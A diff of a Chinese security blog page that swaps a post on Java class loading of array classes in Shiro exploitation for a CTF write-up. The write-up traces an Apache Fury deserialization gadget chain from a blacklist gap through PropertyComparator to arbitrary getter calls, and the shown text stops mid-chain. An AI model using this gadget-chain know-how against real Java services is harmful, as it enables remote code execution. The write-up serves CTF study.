@@ -11,7 +11,7 @@
   <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-  <title>loadClass和forName加载数组类 | Godown_blog</title>
+  <title>2025Aliyun CTF Jtools | Godown_blog</title>
 
   <link rel="icon" type="image/x-icon, image/vnd.microsoft.icon" href="/favicon.ico">
   <link rel="stylesheet" href="https://at.alicdn.com/t/font_1911880_c1nvbyezg17.css">
@@ -591,14 +591,14 @@
 
 
 <div class="post-detail-header" id="thumbnail_canvas" style="background-repeat: no-repeat; background-size: cover; 
-  background-position: center center;position: relative;background-image:url('https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B899.jpg')">
+  background-position: center center;position: relative;background-image:url('https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8133.jpg')">
   <div class="post-detail-header-mask"></div>
   <canvas id="header_canvas"style="position:absolute;bottom:0;pointer-events:none;"></canvas>
   
   <div class="post-detail-header_info-box">
     <div class="title-box">
       <span class="title">
-        loadClass和forName加载数组类
+        2025Aliyun CTF Jtools
       </span>
     </div>
     
@@ -619,88 +619,140 @@
   <div class="main-content">
     <article class="post post-detail">
       <div class="post-content">
-        <p>在打shiro的时候，我们发现不能用Transformer数组，而能用byte[]数组，这是为甚？</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240922200019055.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240922200019055.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>原文：</p>
-<p><a href="https://godownio.github.io/2024/08/06/shiro-fan-xu-lie-hua-shen-ji/">https://godownio.github.io/2024/08/06/shiro-fan-xu-lie-hua-shen-ji/</a></p>
-<h2 id="ClassLoader-loadClass和Class-forName"><a href="#ClassLoader-loadClass和Class-forName" class="headerlink" title="ClassLoader.loadClass和Class.forName"></a>ClassLoader.loadClass和Class.forName</h2><p>先说结论。<code>URLClassLoader#loadClass不能加载数组类，Class#forName可以加载数组类</code></p>
-<h3 id="Class-forName"><a href="#Class-forName" class="headerlink" title="Class.forName"></a>Class.forName</h3><p>Class#forName调用了一个native方法进行加载</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240923102910864.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240923102910864.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>这个分析不了，但是结论就是forName0可以加载数组类，且根据ClassLoader遵循双亲委派逻辑</p>
-<h3 id="ClassLoader-loadClass"><a href="#ClassLoader-loadClass" class="headerlink" title="ClassLoader.loadClass"></a>ClassLoader.loadClass</h3><p>ClassLoader#loadClass实现了双亲委派。</p>
-<p>还记得之前讲的双亲委派机制吗，loadClass向父加载器传递，到顶层再逐层调用findClass查找类</p>
-<p>一般来说ClassLoader的具体实现类都不会修改这个loadClass，而是改findClass方法，改写具体的搜索类的逻辑。比如最常用的URLClassLoader类，也就是ExtClassLoader和AppClassLoader的父类，就没有重写loadClass，而是重写了findClass：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; findClass(<span class="keyword">final</span> String name)</span><br><span class="line">    <span class="keyword">throws</span> ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">final</span> Class&lt;?&gt; result;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        result = AccessController.doPrivileged(</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">PrivilegedExceptionAction</span>&lt;Class&lt;?&gt;&gt;() &#123;</span><br><span class="line">                <span class="keyword">public</span> Class&lt;?&gt; run() <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> name.replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>).concat(<span class="string">&quot;.class&quot;</span>);</span><br><span class="line">                    <span class="type">Resource</span> <span class="variable">res</span> <span class="operator">=</span> ucp.getResource(path, <span class="literal">false</span>);</span><br><span class="line">                    <span class="keyword">if</span> (res != <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            <span class="keyword">return</span> defineClass(name, res);</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(name, e);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;, acc);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (java.security.PrivilegedActionException pae) &#123;</span><br><span class="line">        <span class="keyword">throw</span> (ClassNotFoundException) pae.getException();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (result == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(name);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+        <p>第三届阿里云CTF，复现两道JAVA，应该很多地方都能找到靶场。我是用的赛后环境，趁热用<a target="_blank" rel="noopener" href="https://www.aliyunctf.com/challenges">https://www.aliyunctf.com/challenges</a></p>
+<p>结果发现第二道需要手动构造链表反序列化，大败而归</p>
+<h2 id="Jtools"><a href="#Jtools" class="headerlink" title="Jtools"></a>Jtools</h2><h3 id="找到入口"><a href="#找到入口" class="headerlink" title="找到入口"></a>找到入口</h3><p>现在JAVA题都已经演变成这种了吗，TM谁能想到找黑名单当hint啊？找到hint还得慢慢找入口类</p>
+<p>解压后，idea配好JAR运行程序，直接导入Jtools.jar为库，就可以直接断点调试了</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227204557175.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227204557175.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250227204557175"></p>
+<p>入口只有一个，就是com.app.Server </p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227192334666.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227192334666.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250227192334666"></p>
+<p>用MANIFEST.MF定义了jar文件的入口为com.app.Server</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227193007081.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227193007081.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250227193007081"></p>
+<p>审计Server，就是个使用Fury库反序列化Base64编码的数据</p>
+<p>Fury基本语法可以看apache fury官网：<a target="_blank" rel="noopener" href="https://fury.apache.org/zh-CN/docs/guide/java_object_graph_guide/">https://fury.apache.org/zh-CN/docs/guide/java_object_graph_guide/</a></p>
+<p>但是没必要学会怎么使用，下面这个语句就是创建一个解析JAVA语言的Fury实例</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Fury</span> <span class="variable">fury</span> <span class="operator">=</span> Fury.builder().withLanguage(Language.JAVA).requireClassRegistration(<span class="literal">false</span>).build();</span><br></pre></td></tr></table></figure>
 
-<p>发现在这里将全类名转成了&#x2F;a&#x2F;b&#x2F;c.class形式，然后调用defineClass去加载类文件。那么这里实际也解释了为什么常用的ClassLoader.getSystemClassLoader().loadClass无法加载数组，因为数组类的Class名称又带括号又带分号的，比如<code>[Lorg.apache.commons.collections.Transformer;</code>，肯定对应不上文件。</p>
-<p>即URLClassLoader不能加载数组类</p>
-<h2 id="shiro-中的loadClass"><a href="#shiro-中的loadClass" class="headerlink" title="shiro 中的loadClass"></a>shiro 中的loadClass</h2><p>当时Shiro的报错信息里有<code>[Lorg.apache.commons.collections.Transformer;</code></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227193411923.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227193411923.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250227193411923"></p>
+<p>OK拿着WP装模作样调一下</p>
+<p>跟进到Fury.deserialize，调用了另外一个参数的deserialize</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227210936917.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227210936917.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250227210936917"></p>
+<p><code>deserialize(MemoryBuffer buffer, Iterable&lt;MemoryBuffer&gt; outOfBandBuffers)</code>就是根据魔数选用不同的反序列化，这里肯定不是XLANG协议，进到readRef</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227211236191.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227211236191.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250227211236191"></p>
+<p>readRef调用readDataInternal</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227211318882.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227211318882.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250227211318882"></p>
+<p>readDataInternal根据传入的对象类型选择不同的反序列化器。如果传的不是基础类型，就默认进到default调用对应反序列化器的read方法</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227211413339.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227211413339.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250227211413339"></p>
+<p>从这里看不出fury有什么漏洞</p>
+<p>注意到native-image.properties中，把DisallowedList也放到了启动时加载的类中</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227213421035.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227213421035.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250227213421035"></p>
 <blockquote>
-<p>[L是一个JVM的标记，说明实际上这是一个数组，即Transformer[]</p>
+<p>native-image.properties 是用于配置 GraalVM Native Image 编译选项的属性文件。它允许开发者指定在将 Java 应用程序编译为原生可执行文件时使用的各种参数和选项。</p>
 </blockquote>
-<p>shiro的漏洞点DefaultSerializar.deserialize，在readObject前，用自定义的ClassResolvingObjectInputStream解析了输入流，而不是用默认的ObjectInputStream</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240922203138768.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240922203138768.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>该类resolveClass用自定义的forName查找类，而不是Class.forName</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240922203248779.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240922203248779.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>如果使用DisallowedList，则会从本地读取fury&#x2F;disallowed.txt文件，应用黑名单。</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227213637843.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227213637843.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250227213637843"></p>
+<p>从官网的org.apache.fury:fury-core:0.8.0，也找到一份disallowed.txt，diff一下发现少了一个sun.print，多了一个com.feilong.lib</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227215037890.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227215037890.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250227215037890"></p>
+<h3 id="compare"><a href="#compare" class="headerlink" title="compare"></a>compare</h3><p>下面感觉是codeQL做的了（，正常真的很难找到入口类</p>
+<p><code>com.feilong.core.util.comparator.PropertyComparator#compare()</code>两个参数不为空且不同的情况下，调用了PropertyUtil.getProperty</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227223158647.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227223158647.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250227223158647"></p>
+<p>接着调用了PropertyValueObtainer.obtain</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227223320962.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227223320962.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250227223320962"></p>
+<p>object方法调用PropertyDescriptorUtil.isUseSpringOperate()判断本地是否有spring依赖，如果是就调用getDataUseSpring去获取数据，否则调用getDataUserApache以Apache的方式获取数据</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227223453193.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227223453193.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250227223453193"></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227223650671.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227223650671.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250227223650671"></p>
+<p>跟进getType，可以看到getType就是从缓存MAP里读取type，没有的话就调用buildType新建Type</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227224113840.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227224113840.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250227224113840"></p>
+<p>buildType调用getSpringpropertyDescriptor获取类的属性描述符</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227224208654.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227224208654.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250227224208654"></p>
 <blockquote>
-<p>resolveClass 是反序列化中用来查找类的方法。读取序列化流的时候，读到一个字符串形式的类名，需要通过这个方法来找到对应的对象。</p>
+<p>属性描述符（PropertyDescriptor）是 Java 中用于描述类的某个属性（字段）的元数据信息。它通常包含以下内容：<br>属性名称、属性类型、获取该属性值的方法（getter 方法）、设置该属性值的方法（setter 方法）<br>在 Java 中，PropertyDescriptor 类位于 java.beans 包中，常用于反射机制来获取和操作类的属性。通过 PropertyDescriptor，可以动态地访问对象的属性，而不需要直接调用 getter 和 setter 方法。</p>
 </blockquote>
-<p>调用了这什么静态变量的loadClass</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240922203633004.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240922203633004.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>也就是ExceptionIgnoringAccessor.loadClass</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240922203708443.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240922203708443.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>先getClassLoader获取类加载器，然后调用该类加载器的loadClass</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240922203835867.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240922203835867.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>不同中间件的类加载器不同，Tomcat中是ParallelWebappClassLoader</p>
-<p>网上下个Tomcat 8.5.6源码分析一下</p>
-<p>ParallelWebappClassLoader继承WebappClassLoaderBase，且未重写loadClass，那就看WebappClassLoaderBase.loadClass</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240922204156808.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240922204156808.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>草，这个也没重写，我TM跟跟跟</p>
-<p>最后跟到WebappClassLoaderBase，挖草，巴拉一串，可以读注释的英文（很快，别读，我直接抄结论</p>
-<p>1、先在tomcat的缓存中查找该类是否已经加载过<br>2、如果没有，在jdk的缓存里查找该类是否已经加载过<br>3、如果没有，则使用ExtClassLoader#loadClass加载，ExtClassLoader会走双亲委派。这里是为了在打破双亲委派的同时保留加载系统内置类的功能，绕过AppClassLoader。<br>4、如果没有加载成功，判断是否设置了delegate也就是遵循双亲委派，默认是false，就会调用WebAppClassLoader#findClass方法进行加载。<br>5、如果没有加载成功，会用父类加载器调用Class#forName进行加载，也就是用tomcat中的CommonClassLoader。</p>
-<p>delegateLoad为false，能进if。</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240922223036102.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240922223036102.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp">可以看到在这个过程里，实际上是既有Class#forName又有ClassLoader#loadClass的。加载类的地方实际就两个WebAppClassLoader#findClass和用CommonClassLoader调用Class#forName</p>
-<ul>
-<li>findClass为什么没有加载成功呢？</li>
-</ul>
-<p>WebAppClassLoader#findClass调用了findClassInternal，name一开始就经过了binaryNameToPath</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240923110029463.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240923110029463.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>换成了和URLClassLoader#findClass类似的改成&#x2F;a&#x2F;b&#x2F;c.class形式，也不能加载数组类</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240923110051795.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240923110051795.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<ul>
-<li>CommonClassLoader调用Class#forName为什么没有加载成功呢？</li>
-</ul>
-<p>Class.forName可以加载数组类，因为进去就处理成正常的Path再进行的双亲委派类加载</p>
-<p>但这里传入的CommonClassLoader是一个URLClassLoader，其中的URL只有tomcat&#x2F;lib下面的jar包，forName进行类加载会遵循双亲委派，配置的类加载器是AppClassLoader，也就是AppClassLoader对应的URLClassLoader及双亲委派向上走到的ExtClassLoader（也是URLClassLoader，只包括tomcat&#x2F;lib），bootClassLoader Path对应的类都能加载，其中就包括Java原生类和tomcat&#x2F;lib下面的jar。</p>
-<p>其他的数组类因为URLClassLoader只包括tomcat&#x2F;lib的原因，比如WEB-INF&#x2F;classes和WEB-INF&#x2F;lib都加载不了</p>
-<p>shiro这里的loadClass，ClassLoader加载数组因为类名改为了数组形式，在前面几次都查找不到，错失良机。走到了Class.forName，在Tomcat作为中间件的情况下，却因为Tomcat自定义双亲委派的原因，查找路径又没有我们需要的CC依赖</p>
-<p>Tomcat双亲委派你个骇人鲸</p>
+<p>spring中就是检查是否存在SpringBeanUtils类，用这个类能更方便的返回属性描述符。</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227224907779.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227224907779.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250227224907779"></p>
 <blockquote>
-<p>结论就是，URLClassLoader.loadClass不能加载数组类，Class.forName可以加载数组类。Shiro中自定义了loadClass，只能加载Tomcat lib和JAVA原生数组类</p>
+<p>SpringBeanUtils 是Spring框架中的一个工具类，提供了多种与Bean操作相关的静态方法。在这个场景中，它主要用于获取属性描述符（PropertyDescriptor）。如果项目中没有引入Spring的相关依赖或类加载失败，SpringBeanUtils 类将不可用，此时方法会返回null。</p>
 </blockquote>
-<h2 id="2021-0ctf-buggyLoader-loadClass"><a href="#2021-0ctf-buggyLoader-loadClass" class="headerlink" title="2021 0ctf buggyLoader loadClass"></a>2021 0ctf buggyLoader loadClass</h2><p>题目来自2021 腾讯0ctf buggyloader。题目环境：</p>
-<p><a target="_blank" rel="noopener" href="https://github.com/waderwu/My-CTF-Challenges/tree/master/0ctf-2021-final/buggyLoader">https://github.com/waderwu/My-CTF-Challenges/tree/master/0ctf-2021-final/buggyLoader</a></p>
-<p>gitdown直接下载文件夹</p>
-<p><a target="_blank" rel="noopener" href="http://tool.mkblog.cn/downgit">http://tool.mkblog.cn/downgit</a></p>
-<p>题目很明显了，用CC链打</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240922212851740.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240922212851740.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>springboot项目，直接看Controller</p>
-<p>IndexController自己定义了MyObjectInputStream解析输入流</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240922212249180.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240922212249180.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>resolveClass调用loadClass寻找类</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240922212345117.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240922212345117.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>ClassLoader在构造函数给出了，URLClassLoader。</p>
-<p>URLClassLoader.loadClass不能加载数组类。</p>
-<p>一个数组类也不能传，怎么打CC？</p>
-<p>用到了我们上一节讲的，JRMP。利用反序列化漏洞开启RMI服务，再向RMI打CC链，形成二次反序列化</p>
+<p>扯远了，继续回到PropertyValueObtainer.obtain，这里没有spring依赖就调用getDataUseApache</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227225124821.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227225124821.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250227225124821"></p>
+<p>然后调用PropertyUtils.getPropety()，其实后面就和Shiro的CB链原理一样了，复习一遍还是敲上来</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227230006545.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227230006545.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250227230006545"></p>
+<p>PropertyUtils.getPropety()调用到了PropertyUtilsBean.getProperty()</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227230437861.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227230437861.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250227230437861"></p>
+<p>然后调用getSimpleProperty</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227230535360.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227230535360.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250227230535360"></p>
+<p>调用getReadMethod获取了所有的getter，然后invokeMethod进行调用</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227231109755.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227231109755.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250227231109755"></p>
+<p>理一下思路，因为compare()是比较两个对象，所以会调用其对象的每个getter取出对应的属性值，形成一个Comparable进行比较，这就给了调用任意getter的空间</p>
+<p>如果没有在spring环境下，会用Apache的方式处理数据。由于spring下有SpringBeanUtils，可以直接使用其静态方法getPropertyDescriptor得到属性描述符。而无spring依赖下，需要调用PropertyUtils.getProperty去获取对象的属性值，就调用到了对应的getter。那么理论上说来，spring环境下也是调用对应的getter去获取属性值，也会发生漏洞。只是走的路径不同而已。</p>
+<p>所以以后看到compare就要想到任意getter的调用哇</p>
+<p>其实这里的PropertyComparator入口类就是替代的CB链里的BeanComparator的作用</p>
+<h3 id="fury反序列化触发compare"><a href="#fury反序列化触发compare" class="headerlink" title="fury反序列化触发compare"></a>fury反序列化触发compare</h3><p>按照CB链触发compare的思路，前面接上PriorityQueue，就能得到如下的PriorityQueue.add-&gt;offer-&gt;siftUp-&gt;siftUpUsingComparator-&gt;PropertyComparator.compare的链子</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227231849194.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227231849194.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250227231849194"></p>
+<p>现在只需要找到触发PriorityQueue.add的地方</p>
+<p>fury在反序列化PriorityQueue时，打个断点测试得知用的&#96;org.apache.fury.serializer.collection.CollectionSerializers下的内部类PriorityQueueSerializer进行的处理</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250228133044708.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250228133044708.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250228133044708"></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250228133417837.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250228133417837.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250228133417837"></p>
+<p>由于该类并没有read方法，而其父类CollectionSerializer有，所以调用到的CollectionSerializer.read()，该方法有调用了readElements</p>
